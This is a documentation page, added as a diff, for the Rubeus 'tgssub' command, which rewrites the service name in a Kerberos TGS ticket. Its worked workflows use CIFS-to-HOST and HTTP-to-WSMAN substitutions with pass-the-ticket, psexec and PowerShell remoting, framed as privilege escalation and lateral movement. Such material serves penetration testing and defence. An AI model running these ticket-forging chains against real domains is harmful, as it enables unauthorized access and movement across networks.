@@ -1,0 +1,177 @@
+---
+title: 'tgssub'
+description: 'Substitute service names in TGS tickets for alternative service access'
+icon: 'repeat'
+sidebarTitle: 'tgssub'
+---
+
+## Overview
+
+Substitute the service name in a TGS ticket to access alternative services on the same host. This technique leverages the fact that service tickets are often valid for multiple services running under the same account context.
+
+## Syntax
+
+```bash
+Rubeus.exe tgssub /ticket:TICKET /service:NEW_SERVICE [options]
+```
+
+## Required Parameters
+
+<ParamField path="ticket" type="string" required>
+  Base64-encoded ticket data or path to .kirbi file
+</ParamField>
+
+<ParamField path="service" type="string" required>
+  New service name to substitute
+</ParamField>
+
+## Optional Parameters
+
+<ParamField path="outfile" type="string">
+  Save modified ticket to file
+</ParamField>
+
+<ParamField path="ptt" type="boolean">
+  Pass-the-ticket (inject modified ticket)
+</ParamField>
+
+## Examples
+
+<CodeGroup>
+```bash Service Substitution
+# Change CIFS ticket to HOST for admin access
+Rubeus.exe tgssub /ticket:cifs_ticket.kirbi /service:host/server.corp.local /ptt
+
+# Change HTTP ticket to LDAP
+Rubeus.exe tgssub /ticket:http_ticket.kirbi /service:ldap/dc.corp.local
+
+# Save modified ticket to file
+Rubeus.exe tgssub /ticket:original.kirbi /service:mssql/db.corp.local /outfile:modified.kirbi
+```
+</CodeGroup>
+
+## Service Substitution Concepts
+
+<Accordion title="Same Account Services">
+  **Service Context:**
+  - Services running under same account can often be substituted
+  - Machine account services (HOST, CIFS, HTTP, etc.)
+  - Service account with multiple SPNs
+  - Shared service account contexts
+
+  **Common Substitutions:**
+  - CIFS → HOST (file access to admin access)
+  - HTTP → LDAP (web access to directory access)
+  - HOST → CIFS (admin access to file access)
+  - Any service → WSMAN (PowerShell remoting)
+</Accordion>
+
+## Use Cases
+
+<Accordion title="Privilege Escalation">
+  **Access Expansion:**
+  - Convert file access to administrative access
+  - Escalate web service access to directory access
+  - Enable remote administration from basic services
+  - Access database services from web services
+
+  **Lateral Movement:**
+  - Use existing service tickets for different access methods
+  - Expand attack surface with minimal additional authentication
+  - Leverage service account relationships
+  - Access services not directly targeted
+</Accordion>
+
+## Common Service Mappings
+
+<Accordion title="Machine Account Services">
+  **Windows Machine Services:**
+  ```bash
+  # CIFS to HOST (file access to admin)
+  Rubeus.exe tgssub /ticket:cifs.kirbi /service:host/target.corp.local
+
+  # HTTP to WSMAN (web to PowerShell remoting)
+  Rubeus.exe tgssub /ticket:http.kirbi /service:wsman/target.corp.local
+
+  # HOST to LDAP (admin to directory)
+  Rubeus.exe tgssub /ticket:host.kirbi /service:ldap/target.corp.local
+  ```
+
+  **Service Relationships:**
+  - Most machine services run under SYSTEM/machine account
+  - Tickets are often interchangeable
+  - Different services provide different access methods
+  - Substitution leverages shared service context
+</Accordion>
+
+## Integration Workflows
+
+<Accordion title="Access Expansion">
+  **Complete Workflow:**
+  ```bash
+  # 1. Obtain service ticket (any method)
+  Rubeus.exe asktgs /service:cifs/fileserver.corp.local /ptt
+
+  # 2. Substitute for administrative access
+  Rubeus.exe tgssub /ticket:cifs_ticket.kirbi /service:host/fileserver.corp.local /ptt
+
+  # 3. Use administrative access
+  psexec \\fileserver.corp.local cmd
+  ```
+</Accordion>
+
+<Accordion title="Service Chaining">
+  **Multi-Service Access:**
+  ```bash
+  # 1. Start with basic web service access
+  Rubeus.exe tgssub /ticket:http.kirbi /service:cifs/target.corp.local /ptt
+
+  # 2. Access file system
+  dir \\target.corp.local\c$
+
+  # 3. Substitute for WSMAN access
+  Rubeus.exe tgssub /ticket:http.kirbi /service:wsman/target.corp.local /ptt
+
+  # 4. Use PowerShell remoting
+  Enter-PSSession -ComputerName target.corp.local
+  ```
+</Accordion>
+
+## Technical Considerations
+
+<Accordion title="Substitution Requirements">
+  **Valid Substitutions:**
+  - Services must run under same account context
+  - Target host must support the substituted service
+  - Service must be registered and available
+  - Account must have appropriate permissions
+
+  **Limitations:**
+  - Cannot substitute across different service accounts
+  - Host must actually run the target service
+  - Service-specific permissions still apply
+  - Some services may have additional validation
+</Accordion>
+
+## Service Discovery
+
+<Accordion title="Target Service Identification">
+  **Service Enumeration:**
+  - LDAP queries for registered SPNs
+  - Network service discovery
+  - Port scanning for active services
+  - Service account analysis
+
+  **Strategic Targeting:**
+  - Identify high-value services on target hosts
+  - Map service account relationships
+  - Find services with elevated privileges
+  - Discover administrative service access
+</Accordion>
+
+## Related Commands
+
+- [`asktgs`](/commands/ticket-requests/asktgs) - Obtain service tickets for substitution
+- [`ptt`](/commands/management/ptt) - Inject substituted tickets
+- [`describe`](/commands/management/describe) - Analyze original and modified tickets
+- [`s4u`](/commands/delegation/s4u) - Alternative service access method
